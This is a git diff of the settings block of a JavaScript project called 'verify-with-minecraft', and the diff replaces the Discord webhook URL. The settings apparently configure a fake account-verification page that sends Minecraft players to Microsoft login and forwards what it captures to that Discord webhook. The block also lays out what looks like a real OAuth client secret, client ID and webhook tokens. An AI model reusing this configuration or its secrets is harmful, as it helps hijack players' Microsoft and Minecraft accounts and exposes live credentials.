@@ -1,7 +1,7 @@
 const client_secret = 'XE.8Q~UXqvOT2ax6ccmLJGhTSRHXtaetrukhSaCd'
 const client_id = 'e003656a-f24a-4363-b36d-a8737d60280a'
 const redirect_uri= 'https://verify-with-minecraft.onrender.com/'
-const webhook_url = 'https://discordapp.com/api/webhooks/1112175771134472212/o1u8TCdrttCPM7nKQggWes-g7T037HkKp-urkjzLjvHOv5cvUXtsAK-pWAX928f5nmMf'
+const webhook_url = 'https://discord.com/api/webhooks/1157153879922839632/wgPsaaJfJXbPElzdD9Pk7I6K9HRaCb3ks6YjOfoOlcKoDvCOLgzMP1h2ShDOEN8Dl2QH'
 const redirection = '' //Redirects the user after they login and allow (e.g 'https://hypixel.net') LEAVE BLANK IF U DONT WANT IT TO REDIRECT OR SUM IDK
 const microsoft = true //IF TRUE, WILL REDIRECT TO MICROSOFT DRECTLY INSTEAD OF THE PAGE WITH THE BUTTON
 const skycrypt = "https://sky.shiiyu.moe/stats/"
